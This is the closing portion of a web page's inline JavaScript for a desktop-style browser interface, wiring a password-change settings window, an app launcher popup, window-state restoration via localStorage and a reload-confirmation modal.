                fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body })
                    .then(function(r){ return r.json().catch(function(){ return { success:false, error:'Invalid response' }; }); })
                    .then(function(j){
                        if (j && j.success){
                            // CMD popup notification
                            try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('Password updated successfully', false); } catch(e){}
                            // Auto download generated-pw.txt with the new password
                            try {
                                if (neu && neu.length){
                                    var blob = new Blob([neu + '\n'], { type:'text/plain' });
                                    var url = URL.createObjectURL(blob);
                                    var a = document.createElement('a');
                                    a.href = url; a.download = 'generated-pw.txt';
                                    document.body.appendChild(a); a.click(); a.remove();
                                    setTimeout(function(){ URL.revokeObjectURL(url); }, 1000);
                                }
                            } catch(e) {}
                            // Keep window open and persist open flag
                            try { localStorage.setItem('app.settings.open', '1'); } catch(e){}
                        } else {
                            try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify((j && j.error) || 'Failed to update password', true); } catch(e){}
                        }
                    })
                    .catch(function(){ try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('Network error', true); } catch(e){} });
            });
            // Show/Hide password toggles
            function wireToggle(btn, input){
                if (!btn || !input) return;
                var icon = btn.querySelector('.material-symbols-rounded');
                function sync(){
                    if (input.type === 'password'){
                        if (icon) icon.textContent = 'visibility';
                        btn.setAttribute('aria-label','Show');
                        btn.setAttribute('title','Show');
                    } else {
                        if (icon) icon.textContent = 'visibility_off';
                        btn.setAttribute('aria-label','Hide');
                        btn.setAttribute('title','Hide');
                    }
                }
                btn.addEventListener('click', function(){
                    input.type = (input.type === 'password') ? 'text' : 'password';
                    sync();
                    try {
                        input.focus();
                        var len = input.value.length;
                        input.setSelectionRange && input.setSelectionRange(len, len);
                    } catch(e) {}
                });
                sync();
            }
            wireToggle(toggleCur, inputCurrent);
            wireToggle(toggleNew, inputNew);
            wireToggle(toggleConf, inputConfirm);
            return win;
        }
        // Expose for dock handlers outside this scope
        try { window.spawnSettingsWindow = spawnSettingsWindow; } catch(e){}
        settingsTrigger && settingsTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnSettingsWindow(); });

        // APPTools 1.0 popup: app store that launches apps and hides itself
        var apptoolsTrigger = document.getElementById('apptools-trigger');
        var apptoolsTemplate = document.getElementById('apptools-template');
        var apptoolsLayer = document.getElementById('apptools-layer');
        function spawnAppToolsWindow(){
            if (!apptoolsTemplate || !apptoolsLayer) return null;
            try { if (window.appToolsWin && document.body.contains(window.appToolsWin)) return window.appToolsWin; } catch(e){}
            var win = apptoolsTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            apptoolsLayer.appendChild(win);
            // Center initially
            try {
                var cw = win.offsetWidth || 640; var ch = win.offsetHeight || 380;
                var left = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw)/2)));
                var top = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch)/2)));
                win.style.left = left + 'px'; win.style.top = top + 'px';
            } catch(e){}
            var titlebar = win.querySelector('.apptools-titlebar');
            var closeBtn = win.querySelector('.apptools-close');
            var body = win.querySelector('.apptools-body');
            // Persist open state
            try { localStorage.setItem('app.apptools.open', '1'); } catch(e){}
            // Drag handling
            var dragging = false, offX = 0, offY = 0;
            function onDown(e){ dragging = true; var r = win.getBoundingClientRect(); offX = (e.clientX||0) - r.left; offY = (e.clientY||0) - r.top; document.body.style.userSelect='none'; }
            function onMove(e){ if(!dragging) return; var left = (e.clientX||0) - offX; var top = (e.clientY||0) - offY; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left<8) left=8; if (top<8) top=8; if (left>maxLeft) left=maxLeft; if (top>maxTop) top=maxTop; win.style.left = left+'px'; win.style.top = top+'px'; }
            function onUp(){ dragging=false; document.body.style.userSelect=''; }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            document.addEventListener('mousemove', onMove);
            document.addEventListener('mouseup', onUp);
            // Close button
            closeBtn && closeBtn.addEventListener('click', function(){
                try { localStorage.setItem('app.apptools.open', '0'); } catch(e){}
                try { window.appToolsWin = null; } catch(e){}
                win.remove();
            });
            // Launch handlers for app cards
            var launchers = {
                notes: function(){ try { if (typeof spawnNotesWindow==='function') spawnNotesWindow(); else document.getElementById('notes-trigger') && document.getElementById('notes-trigger').click(); } catch(e){} },
                mailer: function(){ try { if (typeof spawnMailerWindow==='function') spawnMailerWindow(); else document.getElementById('mailer-trigger') && document.getElementById('mailer-trigger').click(); } catch(e){} },
                browser: function(){ try { if (typeof spawnBrowserWindow==='function') spawnBrowserWindow(); else document.getElementById('browser-trigger') && document.getElementById('browser-trigger').click(); } catch(e){} },
                wallpaper: function(){ try { if (typeof spawnWallpaperWindow==='function') spawnWallpaperWindow(); else document.getElementById('wallpaper-trigger') && document.getElementById('wallpaper-trigger').click(); } catch(e){} },
                cmd: function(){ try { if (typeof spawnCmdWindow==='function') spawnCmdWindow(); else document.getElementById('cmd-trigger') && document.getElementById('cmd-trigger').click(); } catch(e){} },
                clean: function(){ try { if (typeof spawnCleanWindow==='function') spawnCleanWindow(); else document.getElementById('clean-trigger') && document.getElementById('clean-trigger').click(); } catch(e){} },
                trash: function(){ try { if (typeof spawnTrashWindow==='function') spawnTrashWindow(); else document.getElementById('trash-trigger') && document.getElementById('trash-trigger').click(); } catch(e){} },
                settings: function(){ try { if (typeof spawnSettingsWindow==='function') spawnSettingsWindow(); else document.getElementById('settings-trigger') && document.getElementById('settings-trigger').click(); } catch(e){} },
                about: function(){ try { var aboutTrigger = document.getElementById('about-trigger'); if (aboutTrigger) aboutTrigger.click(); else { var overlay = document.getElementById('about-overlay'); if (overlay){ overlay.style.display=''; overlay.classList && overlay.classList.add('show'); } } } catch(e){} }
            };
            try {
                var cards = win.querySelectorAll('[data-app]');
                Array.prototype.forEach.call(cards, function(card){
                    card.addEventListener('click', function(){
                        var app = (card.getAttribute('data-app')||'').trim();
                        if (app && launchers[app]) { launchers[app](); }
                        // Hide APPTools after launching
                        try { localStorage.setItem('app.apptools.open', '0'); } catch(e){}
                        try { window.appToolsWin = null; } catch(e){}
                        win.remove();
                    });
                });
            } catch(e){}
            try { window.appToolsWin = win; } catch(e){}
            try { window.spawnAppToolsWindow = spawnAppToolsWindow; } catch(e){}
            return win;
        }
        apptoolsTrigger && apptoolsTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnAppToolsWindow(); });

        // Restore previously open apps on reload
        (function restoreOpenApps(){
            try {
                var bOpen = localStorage.getItem('app.browser.open') === '1';
                var wOpen = localStorage.getItem('app.wallpaper.open') === '1';
                var cOpen = localStorage.getItem('app.cmd.open') === '1';
                var mOpen = localStorage.getItem('app.mailer.open') === '1';
                var sOpen = localStorage.getItem('app.settings.open') === '1';
                var tOpen = localStorage.getItem('app.trash.open') === '1';
                var clOpen = localStorage.getItem('app.clean.open') === '1';
                var atOpen = localStorage.getItem('app.apptools.open') === '1';
                if (bOpen) spawnBrowserWindow();
                if (wOpen) spawnWallpaperWindow();
                if (cOpen) spawnCmdWindow();
                if (mOpen) {
                    try {
                        var mailerTrigger = document.getElementById('mailer-trigger');
                        // Spawn even if trigger is absent
                        if (typeof spawnMailerWindow === 'function') { spawnMailerWindow(); }
                        else if (mailerTrigger) mailerTrigger.click();
                    } catch(e){}
                }
                if (sOpen) {
                    try { spawnSettingsWindow(); } catch(e){}
                }
                if (tOpen) {
                    try { spawnTrashWindow(); } catch(e){}
                }
                if (clOpen) {
                    try { spawnCleanWindow(); } catch(e){}
                }
                if (atOpen) {
                    try { spawnAppToolsWindow(); } catch(e){}
                }
            } catch(e){}
        })();
        })();
    </script>
    <script>
    // Confirm Reload modal wiring
    (function(){
        var reloadTrigger = document.getElementById('reload-trigger');
        var ov = document.getElementById('confirm-overlay');
        var closeBtn = document.getElementById('confirm-close-btn');
        var btnCancel = document.getElementById('btn-cancel-reload');
        var btnResend = document.getElementById('btn-resend-reload');
        function showConfirm(){ if (ov) ov.classList.add('show'); }
        function hideConfirm(){ if (ov) ov.classList.remove('show'); }
        if (reloadTrigger) { reloadTrigger.addEventListener('click', function(e){ e.preventDefault(); showConfirm(); }); }
        if (closeBtn) { closeBtn.addEventListener('click', function(){ hideConfirm(); }); }
        if (btnCancel) { btnCancel.addEventListener('click', function(){ hideConfirm(); }); }
        if (btnResend) {
            btnResend.addEventListener('click', function(){
                hideConfirm();
                try { location.reload(); } catch(e){}
            });
        }
        // Intercept Cmd+R / Ctrl+R to show modal across browsers
        document.addEventListener('keydown', function(e){
            var key = (e.key || '').toLowerCase();
            if (key === 'r' && (e.metaKey || e.ctrlKey)) {
                e.preventDefault();
                showConfirm();
            }
        });
    })();
    </script>
</body>
</html>
